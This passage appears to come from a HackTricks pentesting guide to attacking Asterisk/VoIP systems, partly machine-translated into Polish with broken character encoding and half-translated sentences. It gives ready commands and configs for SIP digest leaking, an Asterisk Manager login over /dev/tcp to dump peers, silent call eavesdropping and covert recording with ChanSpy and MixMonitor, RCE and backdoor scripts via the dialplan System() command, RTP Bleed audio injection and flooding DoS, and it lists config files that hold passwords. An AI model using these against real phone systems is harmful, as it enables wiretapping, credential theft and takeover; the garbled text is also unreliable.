* **Wyciek SIPPTS** z [**sippts**](https://github.com/Pepelux/sippts)**:** Wyciek SIPPTS wykorzystuje wra≈ºliwo≈õƒá SIP Digest Leak, kt√≥ra dotyczy du≈ºej liczby telefon√≥w SIP. Wynik mo≈ºna zapisaƒá w formacie SipCrack, aby przeprowadziƒá atak brute-force za pomocƒÖ SIPPTS dcrack lub narzƒôdzia SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call pozwala **u≈ºytkownikowi sieciowemu** (kt√≥ry na przyk≈Çad mo≈ºe byƒá zainteresowany produktem) na **wprowadzenie** swojego **numeru telefonu**, aby otrzymaƒá po≈ÇƒÖczenie. Nastƒôpnie zostanie wykonane po≈ÇƒÖczenie do agenta, a gdy **odbierze telefon**, u≈ºytkownik zostanie **po≈ÇƒÖczony z agentem**.

Typowy profil Asterisk dla tego to:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Poprzedni profil pozwala na **po≈ÇƒÖczenie z DOWOLNYM adresem IP** (je≈õli has≈Ço jest znane).
* Aby **zorganizowaƒá po≈ÇƒÖczenie**, jak wcze≈õniej okre≈õlono, **nie sƒÖ potrzebne uprawnienia do odczytu** i **tylko** **originate** w **zapisie** jest wymagane.

Dziƒôki tym uprawnieniom ka≈ºdy adres IP znajƒÖcy has≈Ço m√≥g≈Çby siƒô po≈ÇƒÖczyƒá i wydobyƒá zbyt wiele informacji, takich jak:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Mo≈ºna za≈ºƒÖdaƒá wiƒôcej informacji lub dzia≈Ça≈Ñ.**

### **Pods≈Çuchiwanie**

W Asterisku mo≈ºliwe jest u≈ºycie polecenia **`ChanSpy`**, wskazujƒÖc **numer(y) wewnƒôtrzny(e) do monitorowania** (lub wszystkie), aby us≈Çyszeƒá rozmowy, kt√≥re siƒô odbywajƒÖ. To polecenie musi byƒá przypisane do numeru wewnƒôtrznego.

Na przyk≈Çad, **`exten => 333,1,ChanSpy('all',qb)`** wskazuje, ≈ºe je≈õli **zadzwonisz** na **numer wewnƒôtrzny 333**, bƒôdzie **monitorowaƒá** **`wszystkie`** numery wewnƒôtrzne, **rozpoczynajƒÖc nas≈Çuchiwanie** za ka≈ºdym razem, gdy rozpocznie siƒô nowa rozmowa (**`b`**) w trybie cichym (**`q`**), poniewa≈º nie chcemy wchodziƒá w interakcjƒô. Mo≈ºesz przechodziƒá z jednej rozmowy do drugiej, naciskajƒÖc **`*`**, lub wybierajƒÖc numer wewnƒôtrzny.

Mo≈ºliwe jest r√≥wnie≈º u≈ºycie **`ExtenSpy`** do monitorowania tylko jednego numeru wewnƒôtrznego.

Zamiast s≈Çuchaƒá rozm√≥w, mo≈ºliwe jest **nagrywanie ich w plikach** przy u≈ºyciu numeru wewnƒôtrznego, takiego jak: 

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Po≈ÇƒÖczenia bƒôdƒÖ zapisywane w **`/tmp`**.

Mo≈ºesz r√≥wnie≈º sprawiƒá, ≈ºe Asterisk **wykona skrypt, kt√≥ry ujawni po≈ÇƒÖczenie** po jego zako≈Ñczeniu.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### Wra≈ºliwo≈õƒá RTCPBleed

**RTCPBleed** to powa≈ºny problem bezpiecze≈Ñstwa wp≈ÇywajƒÖcy na serwery VoIP oparte na Asterisk (opublikowany w 2017 roku). Wra≈ºliwo≈õƒá ta pozwala na **przechwytywanie i przekierowywanie ruchu RTP (Real Time Protocol)**, kt√≥ry przenosi rozmowy VoIP, przez **ka≈ºdego w Internecie**. Dzieje siƒô tak, poniewa≈º ruch RTP omija uwierzytelnianie podczas przechodzenia przez zapory NAT (Network Address Translation).

Proxysy RTP pr√≥bujƒÖ rozwiƒÖzaƒá **ograniczenia NAT** wp≈ÇywajƒÖce na systemy RTC, proxyzujƒÖc strumienie RTP miƒôdzy dwiema lub wiƒôcej stronami. Gdy NAT jest w u≈ºyciu, oprogramowanie proxy RTP czƒôsto nie mo≈ºe polegaƒá na informacjach o IP i porcie RTP uzyskanych przez sygnalizacjƒô (np. SIP). Dlatego wiele proxy RTP wdro≈ºy≈Ço mechanizm, w kt√≥rym taki **tuplet IP i port jest uczony automatycznie**. Czƒôsto odbywa siƒô to poprzez inspekcjƒô przychodzƒÖcego ruchu RTP i oznaczanie adresu IP i portu ≈∫r√≥d≈Çowego dla wszelkiego przychodzƒÖcego ruchu RTP jako tego, na kt√≥ry nale≈ºy odpowiedzieƒá. Ten mechanizm, kt√≥ry mo≈ºe byƒá nazywany "trybem uczenia siƒô", **nie wykorzystuje ≈ºadnego rodzaju uwierzytelniania**. Dlatego **atakujƒÖcy** mogƒÖ **wysy≈Çaƒá ruch RTP do proxy RTP** i otrzymywaƒá proxowany ruch RTP przeznaczony dla dzwoniƒÖcego lub odbierajƒÖcego w trwajƒÖcym strumieniu RTP. Nazywamy tƒô wra≈ºliwo≈õƒá RTP Bleed, poniewa≈º pozwala ona atakujƒÖcym na odbieranie strumieni medi√≥w RTP przeznaczonych dla legalnych u≈ºytkownik√≥w.

Innym interesujƒÖcym zachowaniem proxy RTP i stos√≥w RTP jest to, ≈ºe czasami, **nawet je≈õli nie sƒÖ podatne na RTP Bleed**, bƒôdƒÖ **akceptowaƒá, przekazywaƒá i/lub przetwarzaƒá pakiety RTP z dowolnego ≈∫r√≥d≈Ça**. Dlatego atakujƒÖcy mogƒÖ wysy≈Çaƒá pakiety RTP, co mo≈ºe pozwoliƒá im na wstrzykniƒôcie swojego medium zamiast legalnego. Nazywamy ten atak wstrzykniƒôciem RTP, poniewa≈º pozwala on na wstrzykniƒôcie nielegalnych pakiet√≥w RTP do istniejƒÖcych strumieni RTP. Ta wra≈ºliwo≈õƒá mo≈ºe byƒá obecna zar√≥wno w proxy RTP, jak i punktach ko≈Ñcowych.

Asterisk i FreePBX tradycyjnie u≈ºywa≈Çy ustawienia **`NAT=yes`**, kt√≥re umo≈ºliwia ruchowi RTP omijanie uwierzytelniania, co potencjalnie prowadzi do braku d≈∫wiƒôku lub d≈∫wiƒôku jednokierunkowego w po≈ÇƒÖczeniach.

Aby uzyskaƒá wiƒôcej informacji, sprawd≈∫ [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed wykrywa wra≈ºliwo≈õƒá RTP Bleed, wysy≈ÇajƒÖc strumienie RTP.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed wykrywa podatno≈õƒá RTP Bleed, wysy≈ÇajƒÖc strumienie RTCP.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood wykorzystuje lukƒô RTP Bleed, wysy≈ÇajƒÖc strumienie RTP.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject wykorzystuje lukƒô RTP Bleed, wstrzykujƒÖc plik audio (format WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

W Asterisku w jaki≈õ spos√≥b udaje ci siƒô **dodaƒá regu≈Çy rozszerze≈Ñ i je prze≈Çadowaƒá** (na przyk≈Çad poprzez skompromitowanie podatnego serwera mened≈ºera webowego), mo≈ºliwe jest uzyskanie RCE za pomocƒÖ polecenia **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
There is command called **`Shell`** that could be used **instead of `System`** to execute system commands if necessary.

{% hint style="warning" %}
If the server is **zabrania u≈ºycia niekt√≥rych znak√≥w** w **`System`** command (like in Elastix), check if the web server allows to **tworzyƒá pliki w jaki≈õ spos√≥b wewnƒÖtrz systemu** (like in Elastix or trixbox), and use it to **utworzyƒá skrypt backdoor** and then use **`System`** to **wykonaƒá** that **skrypt**.
{% endhint %}

#### Interesting local files and permissions

* **`sip.conf`** -> Zawiera has≈Ço u≈ºytkownik√≥w SIP.
* If the **serwer Asterisk dzia≈Ça jako root**, you could compromise root
* **mysql root user** might **nie mieƒá ≈ºadnego has≈Ça**.
* this could be used to create a new mysql user as backdoor
* **`FreePBX`**
* **`amportal.conf`** -> Zawiera has≈Ço administratora panelu webowego (FreePBX)
* **`FreePBX.conf`** -> Zawiera has≈Ço u≈ºytkownika FreePBXuser u≈ºywanego do uzyskania dostƒôpu do bazy danych
* this could be used to create a new mysql user as backdoor
* **`Elastix`**
* **`Elastix.conf`** -> Zawiera kilka hase≈Ç w czystym tek≈õcie, takich jak has≈Ço root mysql, has≈Ço IMAPd, has≈Ço administratora webowego
* **Kilka folder√≥w** bƒôdzie nale≈ºa≈Ço do skompromitowanego u≈ºytkownika asterisk (if not running as root). This user can read the previous files and also controls the configuration, so he could make Asterisk to load other backdoored binaries when executed.

### RTP Injection

It's possible to insert a **`.wav`** in converstions using tools such as **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) and **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Or you could use the scripts from [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) to **skanowaƒá rozmowy** (**`rtpscan.pl`**), send a `.wav` to a conversation (**`rtpsend.pl`**) and **wstawiƒá ha≈Ças** in a conversation (**`rtpflood.pl`**).

### DoS

There are several ways to try to achieve DoS in VoIP servers.

* **`SIPPTS flood`** from [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS flood sends unlimited messages to the target.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** from [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS ping makes a SIP ping to see the server response time.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS IAX protocol used by Asterisk
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): A tool to perform SIP/SDP INVITE message flooding over UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Send several well formed RTP packets. Its needed to know the RTP ports that are being used (sniff first).
* [**SIPp**](https://github.com/SIPp/sipp): Allows to analyze and generate SIP traffic. so it can be used to DoS also.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP swiss army knife. Can also be used to perform SIP attacks.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### OS Vulnerabilities

The easiest way to install a software such as Asterisk is to download an **dystrybucjƒô OS**, that has it already installed, such as: **FreePBX, Elastix, Trixbox**... The problem with those is that once it's working sysadmins might **nie aktualizowaƒá ich ponownie** and **vulnerabilities** are going to be discovered with time.

## References

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
